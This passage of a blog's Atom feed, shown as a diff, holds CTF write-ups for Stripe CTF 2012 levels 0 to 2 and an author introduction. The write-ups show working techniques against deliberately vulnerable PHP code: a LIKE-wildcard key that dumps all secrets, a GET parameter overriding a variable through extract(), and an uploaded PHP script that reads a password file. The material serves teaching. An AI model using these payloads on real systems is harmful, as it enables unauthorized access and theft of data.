+bottom of the page, you can see something interesting: &amp;quot;Password for
+Level 3 (accessible only to members of the club)&amp;quot;. Of course, if you
+click on it it doesn't work. Let's see how we can access this file.&lt;/p&gt;
+&lt;p&gt;The key here is that you can upload your picture so that it's displayed
+on your profile page.&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level02-uploaded-picture.png"&gt;&lt;img alt="level02-uploaded-picture" src="/images/level02-uploaded-picture.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;But if you look at the code, you can see that no check is performed on
+the file you upload. Which means you can upload &lt;strong&gt;any&lt;/strong&gt; file, not just a
+picture.&lt;/p&gt;
+&lt;p&gt;You also know where your &amp;quot;picture&amp;quot; is stored: uploads/your_file. So we
+can upload a PHP script that'll open the password file, and visit the
+URL where it's located to execute it:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
+    &lt;span class="nv"&gt;$content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;file_get_contents&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;../password.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
+    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$content&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Let's name this file exploit.php. We upload it:&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level02-uploaded-script.png"&gt;&lt;img alt="level02-uploaded-script" src="/images/level02-uploaded-script.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We can see that no image is displayed (because your browser can't
+display the script as an image), yet the server says it was successfully
+uploaded. Now, we just have to go to upoads/exploit.php, and &lt;strong&gt;bam!&lt;/strong&gt;
+you have the password for this level.&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level02-executing-script.png"&gt;&lt;img alt="level02-executing-script" src="/images/level02-executing-script.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;w00t!&lt;/p&gt;
+</summary></entry><entry><title>Stripe CTF: Level #1</title><link href="https://allyourbase.utouch.fr/stripe-ctf-level-1.html" rel="alternate"></link><updated>2012-10-13T15:52:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-13:stripe-ctf-level-1.html</id><summary type="html">&lt;p&gt;&lt;a class="reference external" href="/images/level01-logo.jpg"&gt;&lt;img alt="level01-logo" src="/images/level01-logo.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;You can find the code of this level
+&lt;a class="reference external" href="/docs/level01-code.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;(sha256:
+&lt;code&gt;b67c313a1a3bebd8702159efae32f95f1b41885f6e00103ee53e896a53194f43&lt;/code&gt;)&lt;/p&gt;
+&lt;p&gt;So, this level wants you to guess a password, stored in a file named
+&amp;quot;secret-combination.txt&amp;quot; on the server. If you manage to do it, it'll
+give you the password for this level. Let's take a look at the code and
+see how to get the password without knowing the combination.&lt;/p&gt;
+&lt;p&gt;The server starts by defining a variable :code`$filename` equal
+to &amp;quot;secret-combination.txt&amp;quot;. That's the file of the combination (I'm so
+deductive). It then retrieves your attempt (which was passed by GET),
+and compares it to the content of the file. If they're the same, the
+server will gives you the sweet, sweet password. Otherwise, tough.&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level01-failed-attempt.png"&gt;&lt;img alt="level01-failed-attempt" src="/images/level01-failed-attempt.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;The thing is, the server doesn't retrieve your attempt using
+&lt;code&gt;$_GET['attempt']&lt;/code&gt;. It uses the &lt;a class="reference external" href="http://php.net/manual/en/function.extract.php"&gt;extract PHP
+function&lt;/a&gt; on the
+:code`$_GET` array. Basically, for every entry code:&lt;cite&gt;$_GET['key'] = value&lt;/cite&gt;,
+it'll create a variable :code`$key` with the value
+&lt;code&gt;value&lt;/code&gt;. It means that if we give a parameter filename in the
+GET request, we can override the variable :code`$filename`, and open
+any file. So let's open a non-existing file, and give an empty guess:
+&lt;code&gt;?attempt=&amp;amp;filename=dummy-filename.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This request will set &lt;code&gt;$filename&lt;/code&gt; to &amp;quot;dummy-filename.txt&amp;quot;, so
+that when the server tries to retrieve its content, it'll yield an empty
+string. Since our attempt is empty, it will match, and the server will
+give us the password for this level.&lt;/p&gt;
+&lt;p&gt;&lt;a class="reference external" href="/images/level01-success-attempt.png"&gt;&lt;img alt="level01-success-attempt" src="/images/level01-success-attempt.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;w00t!&lt;/p&gt;
+</summary></entry><entry><title>Stripe CTF: Level #0</title><link href="https://allyourbase.utouch.fr/stripe-ctf-level-0.html" rel="alternate"></link><updated>2012-10-13T15:41:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-13:stripe-ctf-level-0.html</id><summary type="html">&lt;p&gt;&lt;a class="reference external" href="/images/level00-logo.png"&gt;&lt;img alt="level00-logo" src="/images/level00-logo.png" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;You can find the code of this level
+&lt;a class="reference external" href="/docs/level00-code.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;(sha256:
+&lt;code&gt;da9712a1851597d6d4b5a90224a1d0fcaa4b558f55a10ca0c7a115d18fe9dcb7&lt;/code&gt;)&lt;/p&gt;
+&lt;p&gt;So, this level is a safe that keeps your secrets for you. But it also
+keeps secrets for other people. Let's find out how we can recover the
+password for this level.&lt;/p&gt;
+&lt;p&gt;The page is a simple form with three fields: your key, your secret
+and the name of your secret. When you post these values, they are
+registered in a database in this format: (key.secret_name, secret).&lt;/p&gt;
+&lt;p&gt;The safe gives you the possibility to retrieve your secrets by entering
+your key (otherwise, it'd be a stupid safe). Then, it'll do a SQL query
+to get every entry which looks like this: (entered_key.anything,
+anything). The SQL query is this one:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;secrets&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="k"&gt;key&lt;/span&gt; &lt;span class="k"&gt;LIKE&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="ss"&gt;&amp;quot;.%&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;It's a prepared query, used to prevent SQL injection (with quotes and
+the like). The ? will be replaced by the value you send to the server.
+The :code`LIKE` keyword is used to match a string against a regexp.
+The % means &amp;quot;any number of any characters&amp;quot; (kind of like the *).&lt;/p&gt;
+&lt;p&gt;The problem with this is that the key you enter is not sanitized. Well,
+it's sanitized by the prepared query so that you cannot perform SQL
+injection. But it's not sanitized for the :code`LIKE` syntax. So
+let's say you enter % as a key, the query will look like this:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;FROM&lt;/span&gt; &lt;span class="n"&gt;secrets&lt;/span&gt; &lt;span class="k"&gt;WHERE&lt;/span&gt; &lt;span class="k"&gt;key&lt;/span&gt; &lt;span class="k"&gt;LIKE&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;It means &amp;quot;select every secret where the key has the form
+'any_characters.any_characters'&amp;quot;. And that's every secret! So the safe
+will give you every secret stored, and thus, the password for this
+level.&lt;/p&gt;
+&lt;p&gt;w00t!&lt;/p&gt;
+</summary></entry><entry><title>#define AUTHOR Yannick Méheut</title><link href="https://allyourbase.utouch.fr/define-author-yannick-meheut.html" rel="alternate"></link><updated>2012-10-13T03:09:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-13:define-author-yannick-meheut.html</id><summary type="html">&lt;div&gt;&lt;p&gt;Hi everyone!&lt;/p&gt;
+&lt;p&gt;My name is Yannick, I'm a 22 year-old student at the French engineer
+school Télécom ParisTech. I study cryptography and info/netsec. Although
+I find these topics fascinating, I'm pretty new to this world.&lt;/p&gt;
+&lt;/div&gt;&lt;div&gt;&lt;p&gt;&lt;a class="reference external" href="/images/yannick.jpg"&gt;&lt;img alt="yannick" src="/images/yannick.jpg" /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Last month, I decided to participate to the Stripe CTF, and,
+unexpectedly, I managed to capture the flag, yay! I chose to create a
+blog to post my write-ups, to leave a trace of my participation, and
+later post news from the info/netsec world.&lt;/p&gt;
+&lt;p&gt;Hope you have a nice time,&lt;/p&gt;
+&lt;p&gt;Cheers.&lt;/p&gt;
+&lt;/div&gt;</summary></entry></feed>
